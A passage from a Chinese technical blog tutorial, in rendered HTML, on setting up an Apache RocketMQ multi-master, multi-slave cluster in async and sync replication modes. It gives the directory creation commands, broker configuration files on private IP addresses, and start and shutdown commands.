href="#3-3-1-创建目录修改配置" class="headerlink" title="3.3.1 创建目录修改配置"></a>3.3.1 创建目录修改配置</h4><p><strong>创建数据目录</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在各服务器执行以下命令创建数据目录</span></span><br><span class="line"></span><br><span class="line">[admin@rocketmq1 rocketmq]$ mkdir -p /home/admin/rocketmq/data/store</span><br><span class="line">[admin@rocketmq1 rocketmq]$ mkdir -p /home/admin/rocketmq/data/store/commitlog</span><br><span class="line">[admin@rocketmq1 rocketmq]$ mkdir -p /home/admin/rocketmq/data/store/consumequeue</span><br><span class="line">[admin@rocketmq1 rocketmq]$ mkdir -p /home/admin/rocketmq/data/store/index</span><br></pre></td></tr></table></figure><p><strong>修改日志路径</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在各服务器执行以下命令修改日志存储路径</span></span><br><span class="line"></span><br><span class="line">[admin@rocketmq1 rocketmq]$ sed -i  <span class="string">'s#$&#123;user.home&#125;#/home/admin/rocketmq/data#g'</span> conf/*.xml</span><br></pre></td></tr></table></figure><p><strong>配置rocketmq</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置Broker_Master-1</span></span><br><span class="line"></span><br><span class="line">[admin@rocketmq1 rocketmq]$ cat conf/2m-2s-async/broker-a.properties</span><br><span class="line">brokerClusterName=rocketmq-2m-slave-cluster-async</span><br><span class="line">brokerName=rocketmq-broker-m1</span><br><span class="line">brokerId=0</span><br><span class="line">namesrvAddr=192.168.10.76:9876;192.168.10.77:9876;192.168.10.78:9876;192.168.10.79:9876</span><br><span class="line">defaultTopicQueueNums=4</span><br><span class="line">autoCreateTopicEnable=<span class="literal">true</span></span><br><span class="line">autoCreateSubscriptionGroup=<span class="literal">true</span></span><br><span class="line">listenPort=10911</span><br><span class="line">deleteWhen=04</span><br><span class="line">fileReservedTime=120</span><br><span class="line">mapedFileSizeCommitLog=1073741824</span><br><span class="line">mapedFileSizeConsumeQueue=50000000</span><br><span class="line">destroyMapedFileIntervalForcibly=120000</span><br><span class="line">redeleteHangedFileInterval=120000</span><br><span class="line">diskMaxUsedSpaceRatio=88</span><br><span class="line">maxMessageSize=65536</span><br><span class="line">sendMessageThreadPoolNums=128</span><br><span class="line">pullMessageThreadPoolNums=128</span><br><span class="line">storePathRootDir=/home/admin/rocketmq/data/store</span><br><span class="line">storePathCommitLog=/home/admin/rocketmq/data/store/commitlog</span><br><span class="line">storePathConsumeQueue=/home/admin/rocketmq/data/store/consumequeue</span><br><span class="line">storePathIndex=/home/admin/rocketmq/data/store/index</span><br><span class="line">storeCheckpoint=/home/admin/rocketmq/data/store/checkpoint</span><br><span class="line">abortFile=/home/admin/rocketmq/data/store/abort</span><br><span class="line">brokerRole=ASYNC_MASTER</span><br><span class="line">flushDiskType=ASYNC_FLUSH</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置Broker_Master-2</span></span><br><span class="line"></span><br><span class="line">[admin@rocketmq2 rocketmq]$ cat conf/2m-2s-async/broker-b.properties</span><br><span class="line">brokerClusterName=rocketmq-2m-slave-cluster-async</span><br><span class="line">brokerName=rocketmq-broker-m2</span><br><span class="line">brokerId=0</span><br><span class="line">namesrvAddr=192.168.10.76:9876;192.168.10.77:9876;192.168.10.78:9876;192.168.10.79:9876</span><br><span class="line">defaultTopicQueueNums=4</span><br><span class="line">autoCreateTopicEnable=<span class="literal">true</span></span><br><span class="line">autoCreateSubscriptionGroup=<span class="literal">true</span></span><br><span class="line">listenPort=10911</span><br><span class="line">deleteWhen=04</span><br><span class="line">fileReservedTime=120</span><br><span class="line">mapedFileSizeCommitLog=1073741824</span><br><span class="line">mapedFileSizeConsumeQueue=50000000</span><br><span class="line">destroyMapedFileIntervalForcibly=120000</span><br><span class="line">redeleteHangedFileInterval=120000</span><br><span class="line">diskMaxUsedSpaceRatio=88</span><br><span class="line">maxMessageSize=65536</span><br><span class="line">sendMessageThreadPoolNums=128</span><br><span class="line">pullMessageThreadPoolNums=128</span><br><span class="line">storePathRootDir=/home/admin/rocketmq/data/store</span><br><span class="line">storePathCommitLog=/home/admin/rocketmq/data/store/commitlog</span><br><span class="line">storePathConsumeQueue=/home/admin/rocketmq/data/store/consumequeue</span><br><span class="line">storePathIndex=/home/admin/rocketmq/data/store/index</span><br><span class="line">storeCheckpoint=/home/admin/rocketmq/data/store/checkpoint</span><br><span class="line">abortFile=/home/admin/rocketmq/data/store/abort</span><br><span class="line">brokerRole=ASYNC_MASTER</span><br><span class="line">flushDiskType=ASYNC_FLUSH</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置Broker_Master_slave-1</span></span><br><span class="line"></span><br><span class="line">[admin@rocketmq3 rocketmq]$ cat conf/2m-2s-async/broker<span class="_">-a</span>-s.properties</span><br><span class="line">brokerClusterName=rocketmq-2m-slave-cluster-async</span><br><span class="line">brokerName=rocketmq-broker-m1</span><br><span class="line">brokerId=1</span><br><span class="line">namesrvAddr=192.168.10.76:9876;192.168.10.77:9876;192.168.10.78:9876;192.168.10.79:9876</span><br><span class="line">defaultTopicQueueNums=4</span><br><span class="line">autoCreateTopicEnable=<span class="literal">true</span></span><br><span class="line">autoCreateSubscriptionGroup=<span class="literal">true</span></span><br><span class="line">listenPort=10911</span><br><span class="line">deleteWhen=04</span><br><span class="line">fileReservedTime=120</span><br><span class="line">mapedFileSizeCommitLog=1073741824</span><br><span class="line">mapedFileSizeConsumeQueue=50000000</span><br><span class="line">destroyMapedFileIntervalForcibly=120000</span><br><span class="line">redeleteHangedFileInterval=120000</span><br><span class="line">diskMaxUsedSpaceRatio=88</span><br><span class="line">maxMessageSize=65536</span><br><span class="line">sendMessageThreadPoolNums=128</span><br><span class="line">pullMessageThreadPoolNums=128</span><br><span class="line">storePathRootDir=/home/admin/rocketmq/data/store</span><br><span class="line">storePathCommitLog=/home/admin/rocketmq/data/store/commitlog</span><br><span class="line">storePathConsumeQueue=/home/admin/rocketmq/data/store/consumequeue</span><br><span class="line">storePathIndex=/home/admin/rocketmq/data/store/index</span><br><span class="line">storeCheckpoint=/home/admin/rocketmq/data/store/checkpoint</span><br><span class="line">abortFile=/home/admin/rocketmq/data/store/abort</span><br><span class="line">brokerRole=SLAVE</span><br><span class="line">flushDiskType=ASYNC_FLUSH</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置Broker_Master_slave-2</span></span><br><span class="line"></span><br><span class="line">[admin@rocketmq3 rocketmq]$ cat conf/2m-2s-async/broker-b-s.properties</span><br><span class="line">brokerClusterName=rocketmq-2m-slave-cluster-async</span><br><span class="line">brokerName=rocketmq-broker-m2</span><br><span class="line">brokerId=1</span><br><span class="line">namesrvAddr=192.168.10.76:9876;192.168.10.77:9876;192.168.10.78:9876;192.168.10.79:9876</span><br><span class="line">defaultTopicQueueNums=4</span><br><span class="line">autoCreateTopicEnable=<span class="literal">true</span></span><br><span class="line">autoCreateSubscriptionGroup=<span class="literal">true</span></span><br><span class="line">listenPort=10911</span><br><span class="line">deleteWhen=04</span><br><span class="line">fileReservedTime=120</span><br><span class="line">mapedFileSizeCommitLog=1073741824</span><br><span class="line">mapedFileSizeConsumeQueue=50000000</span><br><span class="line">destroyMapedFileIntervalForcibly=120000</span><br><span class="line">redeleteHangedFileInterval=120000</span><br><span class="line">diskMaxUsedSpaceRatio=88</span><br><span class="line">maxMessageSize=65536</span><br><span class="line">sendMessageThreadPoolNums=128</span><br><span class="line">pullMessageThreadPoolNums=128</span><br><span class="line">storePathRootDir=/home/admin/rocketmq/data/store1</span><br><span class="line">storePathCommitLog=/home/admin/rocketmq/data/store/commitlog1</span><br><span class="line">storePathConsumeQueue=/home/admin/rocketmq/data/store/consumequeue1</span><br><span class="line">storePathIndex=/home/admin/rocketmq/data/store/index1</span><br><span class="line">storeCheckpoint=/home/admin/rocketmq/data/store/checkpoint1</span><br><span class="line">abortFile=/home/admin/rocketmq/data/store/abort1</span><br><span class="line">brokerRole=SLAVE</span><br><span class="line">flushDiskType=ASYNC_FLUSH</span><br></pre></td></tr></table></figure><h4 id="3-3-2-启动NameServer"><a href="#3-3-2-启动NameServer" class="headerlink" title="3.3.2 启动NameServer"></a>3.3.2 启动NameServer</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#启动Nameserver1</span></span><br><span class="line">[admin@rocketmq1 rocketmq]$ nohup bash bin/mqnamesrv &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动Nameserver2</span></span><br><span class="line">[admin@rocketmq2 rocketmq]$ nohup bash bin/mqnamesrv &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动Nameserver3</span></span><br><span class="line">[admin@rocketmq3 rocketmq]$ nohup bash bin/mqnamesrv &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动Nameserver4</span></span><br><span class="line">[admin@rocketmq4 rocketmq]$ nohup bash bin/mqnamesrv &amp;</span><br></pre></td></tr></table></figure><h4 id="3-3-3-启动Broker"><a href="#3-3-3-启动Broker" class="headerlink" title="3.3.3 启动Broker"></a>3.3.3 启动Broker</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#启动Broker_Master-1</span></span><br><span class="line">[admin@rocketmq1 rocketmq]$ nohup bash bin/mqbroker -c conf/2m-2s-async/broker-a.properties &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动Broker_Master-2</span></span><br><span class="line">[admin@rocketmq2 rocketmq]$ nohup bash bin/mqbroker -c conf/2m-2s-async/broker-b.properties &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动Broker_Master_slave-1</span></span><br><span class="line">[admin@rocketmq3 rocketmq]$ nohup bash bin/mqbroker -c conf/2m-2s-async/broker<span class="_">-a</span>-s.properties &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动Broker_Master_slave-2</span></span><br><span class="line">[admin@rocketmq4 rocketmq]$ nohup bash bin/mqbroker -c conf/2m-2s-async/broker-b-s.properties &amp;</span><br></pre></td></tr></table></figure><h4 id="3-3-4-关闭服务"><a href="#3-3-4-关闭服务" class="headerlink" title="3.3.4 关闭服务"></a>3.3.4 关闭服务</h4><p><strong>关闭NameServer</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[admin@rocketmq1 rocketmq]$ bash bin/mqshutdown namesrv</span><br></pre></td></tr></table></figure><p><strong>关闭Broker</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> [admin@rocketmq1 rocketmq]$ bash bin/mqshutdown broker</span><br></pre></td></tr></table></figure><h3 id="3-4-多Master多Slave模式-同步双写"><a href="#3-4-多Master多Slave模式-同步双写" class="headerlink" title="3.4 多Master多Slave模式-同步双写"></a>3.4 多Master多Slave模式-同步双写</h3><p>每个Master配置一个Slave，有多对Master-Slave，HA采用同步双写方式，即只有主备都写成功，才向应用返回成功，这种模式的优缺点如下：</p><ul><li>优点：数据与服务都无单点故障，Master宕机情况下，消息无延迟，服务可用性与数据可用性都非常高；</li><li>缺点：性能比异步复制模式略低（大约低10%左右），发送单个消息的RT会略高，且目前版本在主节点宕机后，备机不能自动切换为主机。</li></ul><p><strong>环境如下：</strong></p><table><thead><tr><th>主机</th><th>IP地址</th><th>组件划分</th></tr></thead><tbody><tr><td>rocketmq1</td><td>192.168.10.76</td><td>Nameserver1、Broker_Master-1</td></tr><tr><td>rocketmq2</td><td>192.168.10.77</td><td>Nameserver2、Broker_Master-2</td></tr><tr><td>rocketmq3</td><td>192.168.10.78</td><td>Nameserver3、Broker_Master_slave-1</td></tr><tr><td>rocketmq4</td><td>192.168.10.79</td><td>Nameserver4、Broker_Master_slave-2</td></tr></tbody></table><h4 id="3-2-1-创建目录修改配置-1"><a href="#3-2-1-创建目录修改配置-1" class="headerlink" title="3.2.1 创建目录修改配置"></a>3.2.1 创建目录修改配置</h4><p><strong>创建数据目录</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在各服务器执行以下命令创建数据目录</span></span><br><span class="line"></span><br><span class="line">[admin@rocketmq1 rocketmq]$ mkdir -p /home/admin/rocketmq/data/store</span><br><span class="line">[admin@rocketmq1 rocketmq]$ mkdir -p /home/admin/rocketmq/data/store/commitlog</span><br><span class="line">[admin@rocketmq1 rocketmq]$ mkdir -p /home/admin/rocketmq/data/store/consumequeue</span><br><span class="line">[admin@rocketmq1 rocketmq]$ mkdir -p /home/admin/rocketmq/data/store/index</span><br></pre></td></tr></table></figure><p><strong>修改日志路径</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在各服务器执行以下命令修改日志存储路径</span></span><br><span class="line"></span><br><span class="line">[admin@rocketmq1 rocketmq]$ sed -i  <span class="string">'s#$&#123;user.home&#125;#/home/admin/rocketmq/data#g'</span> conf/*.xml</span><br></pre></td></tr></table></figure><p><strong>配置rocketmq</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置Broker_Master-1</span></span><br><span class="line"></span><br><span class="line">[admin@rocketmq1 rocketmq]$ cat conf/2m-2s-sync/broker-a.properties</span><br><span class="line">brokerClusterName=rocketmq-2m-slave-cluster-sync</span><br><span class="line">brokerName=rocketmq-broker-m1</span><br><span class="line">brokerId=0</span><br><span class="line">namesrvAddr=192.168.10.76:9876;192.168.10.77:9876;192.168.10.78:9876;192.168.10.79:9876</span><br><span class="line">defaultTopicQueueNums=4</span><br><span class="line">autoCreateTopicEnable=<span class="literal">true</span></span><br><span class="line">autoCreateSubscriptionGroup=<span class="literal">true</span></span><br><span class="line">listenPort=10911</span><br><span class="line">deleteWhen=04</span><br><span class="line">fileReservedTime=120</span><br><span class="line">mapedFileSizeCommitLog=1073741824</span><br><span class="line">mapedFileSizeConsumeQueue=50000000</span><br><span class="line">destroyMapedFileIntervalForcibly=120000</span><br><span class="line">redeleteHangedFileInterval=120000</span><br><span class="line">diskMaxUsedSpaceRatio=88</span><br><span class="line">maxMessageSize=65536</span><br><span class="line">sendMessageThreadPoolNums=128</span><br><span class="line">pullMessageThreadPoolNums=128</span><br><span class="line">storePathRootDir=/home/admin/rocketmq/data/store</span><br><span class="line">storePathCommitLog=/home/admin/rocketmq/data/store/commitlog</span><br><span class="line">storePathConsumeQueue=/home/admin/rocketmq/data/store/consumequeue</span><br><span class="line">storePathIndex=/home/admin/rocketmq/data/store/index</span><br><span class="line">storeCheckpoint=/home/admin/rocketmq/data/store/checkpoint</span><br><span class="line">abortFile=/home/admin/rocketmq/data/store/abort</span><br><span class="line">brokerRole=SYNC_MASTER</span><br><span class="line">flushDiskType=SYNC_FLUSH</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置Broker_Master-2</span></span><br><span class="line"></span><br><span class="line">[admin@rocketmq2 rocketmq]$ cat conf/2m-2s-sync/broker-b.properties</span><br><span class="line">brokerClusterName=rocketmq-2m-slave-cluster-sync</span><br><span class="line">brokerName=rocketmq-broker-m2</span><br><span class="line">brokerId=0</span><br><span class="line">namesrvAddr=192.168.10.76:9876;192.168.10.77:9876;192.168.10.78:9876;192.168.10.79:9876</span><br><span class="line">defaultTopicQueueNums=4</span><br><span class="line">autoCreateTopicEnable=<span class="literal">true</span></span><br><span class="line">autoCreateSubscriptionGroup=<span class="literal">true</span></span><br><span class="line">listenPort=10911</span><br><span class="line">deleteWhen=04</span><br><span class="line">fileReservedTime=120</span><br><span class="line">mapedFileSizeCommitLog=1073741824</span><br><span class="line">mapedFileSizeConsumeQueue=50000000</span><br><span class="line">destroyMapedFileIntervalForcibly=120000</span><br><span class="line">redeleteHangedFileInterval=120000</span><br><span class="line">diskMaxUsedSpaceRatio=88</span><br><span class="line">maxMessageSize=65536</span><br><span class="line">sendMessageThreadPoolNums=128</span><br><span class="line">pullMessageThreadPoolNums=128</span><br><span class="line">storePathRootDir=/home/admin/rocketmq/data/store</span><br><span class="line">storePathCommitLog=/home/admin/rocketmq/data/store/commitlog</span><br><span class="line">storePathConsumeQueue=/home/admin/rocketmq/data/store/consumequeue</span><br><span class="line">storePathIndex=/home/admin/rocketmq/data/store/index</span><br><span class="line">storeCheckpoint=/home/admin/rocketmq/data/store/checkpoint</span><br><span class="line">abortFile=/home/admin/rocketmq/data/store/abort</span><br><span class="line">brokerRole=SYNC_MASTER</span><br><span class="line">flushDiskType=SYNC_FLUSH</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置Broker_Master_slave-1</span></span><br><span class="line"></span><br><span class="line">[admin@rocketmq3 rocketmq]$ cat conf/2m-2s-sync/broker<span class="_">-a</span>-s.properties</span><br><span class="line">brokerClusterName=rocketmq-2m-slave-cluster-sync</span><br><span class="line">brokerName=rocketmq-broker-m1</span><br><span class="line">brokerId=1</span><br><span class="line">namesrvAddr=192.168.10.76:9876;192.168.10.77:9876;192.168.10.78:9876;192.168.10.79:9876</span><br><span class="line">defaultTopicQueueNums=4</span><br><span class="line">autoCreateTopicEnable=<span class="literal">true</span></span><br><span class="line">autoCreateSubscriptionGroup=<span class="literal">true</span></span><br><span class="line">listenPort=10911</span><br><span class="line">deleteWhen=04</span><br><span class="line">fileReservedTime=120</span><br><span class="line">mapedFileSizeCommitLog=1073741824</span><br><span class="line">mapedFileSizeConsumeQueue=50000000</span><br><span class="line">destroyMapedFileIntervalForcibly=120000</span><br><span class="line">redeleteHangedFileInterval=120000</span><br><span class="line">diskMaxUsedSpaceRatio=88</span><br><span class="line">maxMessageSize=65536</span><br><span class="line">sendMessageThreadPoolNums=128</span><br><span class="line">pullMessageThreadPoolNums=128</span><br><span class="line">storePathRootDir=/home/admin/rocketmq/data/store</span><br><span class="line">storePathCommitLog=/home/admin/rocketmq/data/store/commitlog</span><br><span class="line">storePathConsumeQueue=/home/admin/rocketmq/data/store/consumequeue</span><br><span class="line">storePathIndex=/home/admin/rocketmq/data/store/index</span><br><span class="line">storeCheckpoint=/home/admin/rocketmq/data/store/checkpoint</span><br><span class="line">abortFile=/home/admin/rocketmq/data/store/abort</span><br><span class="line">brokerRole=SLAVE</span><br><span class="line">flushDiskType=ASYNC_FLUSH</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置Broker_Master_slave-2</span></span><br><span class="line"></span><br><span class="line">[admin@rocketmq3 rocketmq]$ cat conf/2m-2s-sync/broker-b-s.properties</span><br><span class="line">brokerClusterName=rocketmq-2m-slave-cluster-sync</span><br><span class="line">brokerName=rocketmq-broker-m2</span><br><span class="line">brokerId=1</span><br><span class="line">namesrvAddr=192.168.10.76:9876;192.168.10.77:9876;192.168.10.78:9876;192.168.10.79:9876</span><br><span class="line">defaultTopicQueueNums=4</span><br><span class="line">autoCreateTopicEnable=<span class="literal">true</span></span><br><span class="line">autoCreateSubscriptionGroup=<span class="literal">true</span></span><br><span class="line">listenPort=10911</span><br><span class="line">deleteWhen=04</span><br><span class="line">fileReservedTime=120</span><br><span class="line">mapedFileSizeCommitLog=1073741824</span><br><span class="line">mapedFileSizeConsumeQueue=50000000</span><br><span class="line">destroyMapedFileIntervalForcibly=120000</span><br><span class="line">redeleteHangedFileInterval=120000</span><br><span class="line">diskMaxUsedSpaceRatio=88</span><br><span class="line">maxMessageSize=65536</span><br><span class="line">sendMessageThreadPoolNums=128</span><br><span class="line">pullMessageThreadPoolNums=128</span><br><span class="line">storePathRootDir=/home/admin/rocketmq/data/store1</span><br><span class="line">storePathCommitLog=/home/admin/rocketmq/data/store/commitlog1</span><br><span class="line">storePathConsumeQueue=/home/admin/rocketmq/data/store/consumequeue1</span><br><span class="line">storePathIndex=/home/admin/rocketmq/data/store/index1</span><br><span class="line">storeCheckpoint=/home/admin/rocketmq/data/store/checkpoint1</span><br><span class="line">abortFile=/home/admin/rocketmq/data/store/abort1</span><br><span class="line">brokerRole=SLAVE</span><br><span class="line">flushDiskType=ASYNC_FLUSH</span><br></pre></td></tr></table></figure><h4 id="3-4-2-启动NameServer"><a href="#3-4-2-启动NameServer" class="headerlink" title="3.4.2 启动NameServer"></a>3.4.2 启动NameServer</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#启动Nameserver1</span></span><br><span class="line">[admin@rocketmq1 rocketmq]$ nohup bash bin/mqnamesrv &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动Nameserver2</span></span><br><span class="line">[admin@rocketmq2 rocketmq]$ nohup bash bin/mqnamesrv &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动Nameserver3</span></span><br><span class="line">[admin@rocketmq3 rocketmq]$ nohup bash bin/mqnamesrv &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动Nameserver4</span></span><br><span class="line">[admin@rocketmq4 rocketmq]$ nohup bash bin/mqnamesrv &amp;</span><br></pre></td></tr></table></figure><h4 id="3-4-3-启动Broker"><a href="#3-4-3-启动Broker" class="headerlink" title="3.4.3 启动Broker"></a>3.4.3 启动Broker</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#启动Broker_Master-1</span></span><br><span class="line">[admin@rocketmq1 rocketmq]$ nohup bash bin/mqbroker -c conf/2m-2s-sync/broker-a.properties &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动Broker_Master-2</span></span><br><span class="line">[admin@rocketmq2 rocketmq]$ nohup bash bin/mqbroker -c conf/2m-2s-sync/broker-b.properties &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动Broker_Master_slave-1</span></span><br><span class="line">[admin@rocketmq3 rocketmq]$ nohup bash bin/mqbroker -c conf/2m-2s-sync/broker<span class="_">-a</span>-s.properties &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动Broker_Master_slave-2</span></span><br><span class="line">[admin@rocketmq4 rocketmq]$ nohup bash bin/mqbroker -c conf/2m-2s-sync/broker-b-s.properties &amp;</span><br></pre></td></tr></table></figure><h4 id="3-4-4-关闭服务"><a href="#3-4-4-关闭服务" class="headerlink" title="3.4.4 关闭服务"></a>3.4.4 关闭服务</h4><p><strong>关闭NameServer</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[admin@rocketmq1 rocketmq]$ bash bin/mqshutdown namesrv</span><br></pre></td></tr></table></figure><p><strong>关闭Broker</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 